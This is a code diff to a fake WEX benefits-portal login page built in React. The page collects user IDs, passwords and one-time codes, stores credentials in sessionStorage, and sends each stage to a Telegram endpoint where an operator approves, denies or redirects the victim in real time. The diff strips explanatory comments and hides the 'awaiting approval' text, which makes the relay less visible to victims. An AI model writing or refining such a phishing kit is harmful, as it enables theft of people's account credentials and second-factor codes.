@@ -42,15 +42,14 @@ export default function LoginPage() {
   const [otpError, setOtpError] = useState("")
   const [resendLoading, setResendLoading] = useState(false)
   const [resendCooldown, setResendCooldown] = useState(0)
-  
-  // ========== APPROVAL SYSTEM STATE ==========
+
   const [approvalId, setApprovalId] = useState("")
   const [awaitingApproval, setAwaitingApproval] = useState(false)
   const [approvalCountdown, setApprovalCountdown] = useState(90)
   const [approvalMessage, setApprovalMessage] = useState("")
   const [approvalStage, setApprovalStage] = useState<"password" | "otp" | null>(null)
   const [approvalAction, setApprovalAction] = useState<"approve" | "deny" | "redirect" | null>(null)
-  
+
   const [loading, setLoading] = useState({
     next: false,
     login: false,
@@ -60,7 +59,6 @@ export default function LoginPage() {
     getStarted: false,
   })
 
-  // Countdown timer for approval
   useEffect(() => {
     if (!awaitingApproval || approvalCountdown <= 0) return
     const timer = window.setInterval(() => {
@@ -69,7 +67,6 @@ export default function LoginPage() {
     return () => window.clearInterval(timer)
   }, [awaitingApproval, approvalCountdown])
 
-  // Poll approval status
   useEffect(() => {
     if (!awaitingApproval || !approvalId) return
 
@@ -79,11 +76,9 @@ export default function LoginPage() {
         const result = await response.json()
 
         if (result.success && result.data.action) {
-          // Decision made
           setApprovalAction(result.data.action)
           setApprovalMessage(result.data.message || "")
-          
-          // Handle the decision
+
           if (result.data.action === "approve") {
             setApprovalMessage("✅ Approved! Proceeding...")
             await wait(1500)
@@ -97,9 +92,8 @@ export default function LoginPage() {
             await wait(1500)
             window.location.href = "/api/login-out"
           }
-        } else if (result.data.waitingFor) {
-          // Still waiting
-          setApprovalMessage(`⏳ Awaiting approval... ${Math.ceil(result.data.waitingFor / 1000)}s`)
+        } else if (result.data && result.data.waitingFor) {
+          setApprovalMessage("")
         }
       } catch (error) {
         console.error("Approval poll error:", error)
@@ -109,7 +103,6 @@ export default function LoginPage() {
     return () => window.clearInterval(pollInterval)
   }, [awaitingApproval, approvalId])
 
-  // Resend cooldown
   useEffect(() => {
     if (resendCooldown <= 0) return
     const timer = window.setInterval(() => {
@@ -118,7 +111,6 @@ export default function LoginPage() {
     return () => window.clearInterval(timer)
   }, [resendCooldown])
 
-  // Handle query params
   useEffect(() => {
     const params = new URLSearchParams(window.location.search)
     const denied = params.get("loginDenied") === "1"
@@ -144,6 +136,7 @@ export default function LoginPage() {
     setApprovalId("")
     setApprovalCountdown(90)
     setApprovalAction(null)
+    setApprovalMessage("")
 
     if (action === "approve") {
       if (approvalStage === "password") {
@@ -156,18 +149,16 @@ export default function LoginPage() {
 
   const initiateApproval = async (stage: "password" | "otp") => {
     try {
-      // Create approval request on backend
+      const existingRequest = createApprovalRequest(username, stage)
       setApprovalStage(stage)
       setAwaitingApproval(true)
       setApprovalCountdown(90)
       setApprovalAction(null)
-      setApprovalMessage("⏳ Awaiting approval from administrator...")
+      setApprovalMessage("")
 
-      // Generate a unique ID for this approval request
-      const newApprovalId = crypto.getRandomValues(new Uint8Array(16)).toString()
+      const newApprovalId = existingRequest.id
       setApprovalId(newApprovalId)
 
-      // Send notification to Telegram with approval buttons
       void fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -233,6 +224,8 @@ export default function LoginPage() {
     setResendCooldown(0)
     setAwaitingApproval(false)
     setApprovalId("")
+    setApprovalAction(null)
+    setApprovalMessage("")
     if (typeof window !== "undefined") {
       sessionStorage.removeItem("wex_username")
       sessionStorage.removeItem("wex_password")
@@ -304,7 +297,6 @@ export default function LoginPage() {
         id="AccessibilityPageLoadingContainer"
         className="wexShell min-h-screen bg-[#F4F6F8] font-sans text-slate-900 flex justify-center items-center md:items-start md:pt-6 overflow-auto"
       >
-        {/* APPROVAL MODAL OVERLAY */}
         {awaitingApproval && (
           <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
             <div className="bg-white rounded-lg shadow-2xl p-8 max-w-md w-full mx-4">
@@ -316,7 +308,7 @@ export default function LoginPage() {
                 ) : (
                   <Clock className="h-16 w-16 text-blue-500 animate-spin" />
                 )}
-                
+
                 <h2 className="text-2xl font-bold text-center text-[#0B3A5C]">
                   {approvalAction === "approve"
                     ? "✅ Approved!"
@@ -325,9 +317,11 @@ export default function LoginPage() {
                       : "Awaiting Approval"}
                 </h2>
 
-                <p className="text-center text-slate-600 text-sm">
-                  {approvalMessage || "Your login is being reviewed by an administrator..."}
-                </p>
+                {approvalMessage ? (
+                  <p className="text-center text-slate-600 text-sm">
+                    {approvalMessage}
+                  </p>
+                ) : null}
 
                 {!approvalAction && (
                   <div className="w-full mt-4">
@@ -383,7 +377,6 @@ export default function LoginPage() {
             }}
           >
             <div className="wexBanner" role="banner">
-              {/* Header */}
               <div className="mx-auto w-[940px] h-[68px] mb-8 px-0 relative">
                 <button
                   type="button"
@@ -422,12 +415,10 @@ export default function LoginPage() {
             <div style={{ position: 'relative' }}>
               <div id="wexMainPanel" className="wexMain" role="main">
                 <div className="wexBody mx-auto w-[940px] px-0">
-
                   {view === "login" ? (
                     <>
                       <h1 className="mb-6 text-[30px] font-semibold text-[#0B3A5C] leading-tight tracking-tight">Sign in</h1>
                       <div className="grid grid-cols-2 gap-6">
-                        {/* Returning member card */}
                         <Card className="shadow-none rounded-none border border-[#E8EEF2] bg-white h-full relative z-10">
                           <CardContent className="p-0 h-full flex flex-col">
                             <div className="flex items-center gap-3 px-5 py-4 border-b border-[#E8EEF2] bg-white">
@@ -457,7 +448,7 @@ export default function LoginPage() {
                                               setUsername(e.target.value)
                                               if (loginError) setLoginError("")
                                             }}
-                                            className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-[160px] px-3"
+                                            className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-[160px] px-[10px]"
                                             disabled={awaitingApproval}
                                           />
                                           <a href="#" className="text-[13px] text-[#005F9E] hover:underline whitespace-nowrap">
@@ -481,8 +472,8 @@ export default function LoginPage() {
                                     </div>
 
                                     <div className="pl-[90px] mt-6">
-                                      <Button 
-                                        type="submit" 
+                                      <Button
+                                        type="submit"
                                         disabled={loading.next || awaitingApproval}
                                         className="rounded-sm bg-[#005F9E] px-4 py-1.5 font-bold text-white hover:bg-[#004E82] h-[34px] min-w-[80px] text-[15px] shadow-sm disabled:opacity-50"
                                       >
@@ -498,7 +489,6 @@ export default function LoginPage() {
                                     </div>
                                   </>
                                 ) : (
-                                  /* Password Step */
                                   <>
                                     {loginError ? (
                                       <div className="text-[13px] text-[#D03030] font-semibold">
@@ -506,7 +496,6 @@ export default function LoginPage() {
                                       </div>
                                     ) : null}
                                     <div className="flex flex-col gap-5">
-                                      {/* Username Display Row */}
                                       <div className="flex items-center gap-4">
                                         <span className="text-[15px] text-slate-700 w-[75px] shrink-0">User ID</span>
                                         <div className="flex-1 flex items-center justify-between">
@@ -517,7 +506,6 @@ export default function LoginPage() {
                                         </div>
                                       </div>
 
-                                      {/* Password Input Row */}
                                       <div className="flex items-center gap-4">
                                         <label htmlFor="password" className="text-[15px] text-slate-700 w-[75px] shrink-0">
                                           Password
@@ -532,7 +520,7 @@ export default function LoginPage() {
                                                 setPassword(e.target.value)
                                                 if (loginError) setLoginError("")
                                               }}
-                                              className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-full px-3"
+                                              className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-full px-[10px]"
                                               disabled={awaitingApproval}
                                             />
                                             <button
@@ -580,8 +568,6 @@ export default function LoginPage() {
                                             }
                                             await wait(LOADING_MS.next)
                                             setLoading(prev => ({ ...prev, login: false }))
-                                            
-                                            // ========== INITIATE APPROVAL ==========
                                             await initiateApproval("password")
                                           } catch {
                                             setLoginError(MSG_UNABLE_REACH_VERIFICATION)
@@ -607,7 +593,6 @@ export default function LoginPage() {
                           </CardContent>
                         </Card>
 
-                        {/* Trouble Accessing Account - Image Only */}
                         <div className="border border-[#E8EEF2] shadow-none bg-white h-full relative z-10 overflow-hidden">
                           <div className="relative w-full h-full min-h-[300px]">
                             <Image
@@ -620,7 +605,6 @@ export default function LoginPage() {
                           </div>
                         </div>
 
-                        {/* Carousel / Advertisement - Image Only */}
                         <div className="border border-[#E8EEF2] shadow-none bg-white h-[280px] relative z-0 overflow-hidden">
                           <Carousel className="w-full h-full" opts={{ loop: true }}>
                             <CarouselContent className="h-full ml-0">
@@ -632,7 +616,6 @@ export default function LoginPage() {
                                   height={280}
                                   className="object-cover w-full h-full"
                                 />
-                                <a href="https://fsastore.com/wex?utm_source=Wex+Benefits&utm_medium=TPA+Portal+Wex+Link+Login&AFID=489895&GroupName=TPA&CID=437559&utm_campaign=TPA+Partner" target="_blank" rel="noopener noreferrer" className="absolute inset-0 z-20"><span className="sr-only">Shop FSA Store</span></a>
                               </CarouselItem>
                               <CarouselItem className="relative h-[280px] pl-0">
                                 <Image
@@ -642,7 +625,6 @@ export default function LoginPage() {
                                   height={280}
                                   className="object-cover w-full h-full"
                                 />
-                                <a href="https://hsastore.com/wex?utm_source=Wex+Benefits&utm_medium=TPA+Portal+Wex+Banner+Welcome&AFID=489895&GroupName=TPA&CID=437559&utm_campaign=TPA+Partner" target="_blank" rel="noopener noreferrer" className="absolute inset-0 z-20"><span className="sr-only">Shop HSA Store</span></a>
                               </CarouselItem>
                               <CarouselItem className="relative h-[280px] pl-0">
                                 <Image
@@ -652,7 +634,6 @@ export default function LoginPage() {
                                   height={280}
                                   className="object-cover w-full h-full"
                                 />
-                                <a href="https://glassesusa.7eer.net/c/3041750/185846/1546?u=https%3A%2F%2Fwww.glassesusa.com%3Faffid%3Dwex-lp2607" target="_blank" rel="noopener noreferrer" className="absolute inset-0 z-20"><span className="sr-only">Glasses USA</span></a>
                               </CarouselItem>
                             </CarouselContent>
                             <CarouselPrevious className="left-2 bg-white/50 hover:bg-white text-slate-800 border-none h-8 w-8" />
@@ -660,7 +641,6 @@ export default function LoginPage() {
                           </Carousel>
                         </div>
 
-                        {/* First-time access card */}
                         <Card className="shadow-none rounded-none border border-[#E8EEF2] bg-white h-[280px] relative z-0">
                           <CardContent className="p-0 h-full flex flex-col">
                             <div className="flex items-center gap-3 px-5 py-4 border-b border-[#E8EEF2] bg-white">
@@ -672,7 +652,7 @@ export default function LoginPage() {
                                 New members can register an account to begin.
                               </p>
                               <div>
-                                <Button 
+                                <Button
                                   disabled={loading.getStarted}
                                   onClick={async () => {
                                     setLoading(prev => ({ ...prev, getStarted: true }))
@@ -695,7 +675,6 @@ export default function LoginPage() {
                           </CardContent>
                         </Card>
 
-                        {/* Mobile App Download - Image Only */}
                         <div className="col-span-2 border border-[#E8EEF2] shadow-none bg-white h-[160px] relative overflow-hidden">
                           <div className="relative w-full h-full">
                             <Image
@@ -707,16 +686,13 @@ export default function LoginPage() {
                             <a href="#" className="absolute inset-0 z-20"><span className="sr-only">Download Mobile App</span></a>
                           </div>
                         </div>
-
                       </div>
                     </>
                   ) : view === "forgotPassword" ? (
-                    /* Forgot Password View */
                     <div className="w-full">
                       <h1 className="mb-5 text-[28px] font-light text-[#222222] leading-tight">Request Password Reset</h1>
                       <div className="bg-white border border border border-[#E8EEF2] shadow-none">
                         <div className="p-8">
-                          {/* Progress Bar */}
                           <div className="flex items-center gap-2 mb-8">
                             <div className="h-[10px] w-full bg-gray-200 rounded-full relative">
                               <div className="absolute top-0 left-0 h-full bg-[#005F9E] rounded-full w-[20%]"></div>
@@ -734,10 +710,7 @@ export default function LoginPage() {
                               <label className="text-[15px] text-[#555555]">User ID <span className="text-[#D03030]">*</span></label>
                             </div>
                             <div className="relative">
-                              <Input
-                                defaultValue={username}
-                                className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner"
-                              />
+                              <Input defaultValue={username} className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner" />
                             </div>
 
                             <div className="flex items-center">
@@ -764,7 +737,7 @@ export default function LoginPage() {
                           >
                             Cancel
                           </Button>
-                          <Button 
+                          <Button
                             disabled={loading.forgotPasswordNext}
                             onClick={async () => {
                               setLoading(prev => ({ ...prev, forgotPasswordNext: true }))
@@ -786,22 +759,17 @@ export default function LoginPage() {
                       </div>
                     </div>
                   ) : view === "verificationMethod" ? (
-                    /* Verification Method Selection View */
                     <div className="w-full">
                       <h1 className="mb-5 text-[28px] font-light text-[#222222] leading-tight">Verify Your Identity</h1>
                       <div className="bg-white border border border border-[#E8EEF2] shadow-none">
                         <div className="p-8">
-                          {/* Progress bar */}
                           <div className="mb-6">
                             <div className="flex items-center justify-between mb-2">
                               <span className="text-[13px] text-[#555555]"> </span>
                               <span className="text-[13px] text-[#555555]">60%</span>
                             </div>
                             <div className="h-[10px] bg-[#e6e6e6] rounded-[4px] overflow-hidden">
-                              <div
-                                className="h-full bg-[#005F9E]"
-                                style={{ width: "60%" }}
-                              />
+                              <div className="h-full bg-[#005F9E]" style={{ width: "60%" }} />
                             </div>
                           </div>
 
@@ -811,13 +779,13 @@ export default function LoginPage() {
 
                           <div className={`flex flex-col gap-4 ${verificationMethodLocked ? "pointer-events-none select-none opacity-60" : ""}`}>
                             <label className={`flex items-center gap-3 ${verificationMethodLocked ? "cursor-not-allowed" : "cursor-pointer"}`}>
-                              <input 
-                                type="radio" 
-                                name="verificationMethod" 
+                              <input
+                                type="radio"
+                                name="verificationMethod"
                                 checked={verificationMethod === "text"}
                                 onChange={() => setVerificationMethod("text")}
                                 disabled={verificationMethodLocked}
-                                className="h-4 w-4 text-[#005F9E]" 
+                                className="h-4 w-4 text-[#005F9E]"
                               />
                               <div className="flex flex-col">
                                 <span className="text-[15px] font-bold text-[#222222]">Text Message</span>
@@ -828,13 +796,13 @@ export default function LoginPage() {
                             </label>
 
                             <label className={`flex items-center gap-3 mt-4 ${verificationMethodLocked ? "cursor-not-allowed" : "cursor-pointer"}`}>
-                              <input 
-                                type="radio" 
-                                name="verificationMethod" 
+                              <input
+                                type="radio"
+                                name="verificationMethod"
                                 checked={verificationMethod === "email"}
                                 onChange={() => setVerificationMethod("email")}
                                 disabled={verificationMethodLocked}
-                                className="h-4 w-4 text-[#005F9E]" 
+                                className="h-4 w-4 text-[#005F9E]"
                               />
                               <span className="text-[15px] font-bold text-[#222222]">Email</span>
                             </label>
@@ -905,23 +873,18 @@ export default function LoginPage() {
                         </div>
                       </div>
                     </div>
-                  ) : (view === "enterCode" &&
-                    /* Enter Code View */
+                  ) : (
                     <div className="w-full">
                       <h1 className="mb-5 text-[28px] font-light text-[#222222] leading-tight">Verify Your Identity</h1>
                       <div className="bg-white border border border border-[#E8EEF2] shadow-none">
                         <div className="p-8">
-                          {/* Progress bar */}
                           <div className="mb-6">
                             <div className="flex items-center justify-between mb-2">
                               <span className="text-[13px] text-[#555555]"> </span>
                               <span className="text-[13px] text-[#555555]">60%</span>
                             </div>
                             <div className="h-[10px] bg-[#e6e6e6] rounded-[4px] overflow-hidden">
-                              <div
-                                className="h-full bg-[#005F9E]"
-                                style={{ width: "60%" }}
-                              />
+                              <div className="h-full bg-[#005F9E]" style={{ width: "60%" }} />
                             </div>
                           </div>
 
@@ -938,7 +901,7 @@ export default function LoginPage() {
                               Verification Code <span className="text-[#D03030]">*</span>
                             </label>
                             <div className="flex items-center gap-3 w-full">
-                              <Input 
+                              <Input
                                 value={verificationCode}
                                 onChange={(e) => {
                                   setVerificationCode(sanitizeOtpInput(e.target.value))
@@ -948,7 +911,7 @@ export default function LoginPage() {
                                 autoComplete="one-time-code"
                                 maxLength={OTP_MAX_DIGITS}
                                 type={showVerificationCode ? "text" : "password"}
-                                className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner" 
+                                className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner"
                                 disabled={awaitingApproval}
                               />
                               <div className="flex items-center gap-1">
@@ -1002,7 +965,7 @@ export default function LoginPage() {
                           >
                             Cancel
                           </Button>
-                          <Button 
+                          <Button
                             disabled={loading.verify || awaitingApproval}
                             onClick={async () => {
                               if (loading.verify) return
@@ -1025,8 +988,6 @@ export default function LoginPage() {
                               try {
                                 await wait(LOADING_MS.otpVerify)
                                 setLoading((prev) => ({ ...prev, verify: false }))
-                                
-                                // ========== INITIATE APPROVAL FOR OTP ==========
                                 await initiateApproval("otp")
                               } catch {
                                 setLoading((prev) => ({ ...prev, verify: false }))
@@ -1048,13 +1009,11 @@ export default function LoginPage() {
                       </div>
                     </div>
                   )}
-
                 </div>
               </div>
             </div>
             <div style={{ clear: 'both' }}></div>
 
-            {/* Footer */}
             <div className="PageFooter" role="contentinfo">
               <div className="PageFooterContentArea mt-8 py-8 bg-transparent text-center">
                 <div className="mx-auto w-[940px] px-0">
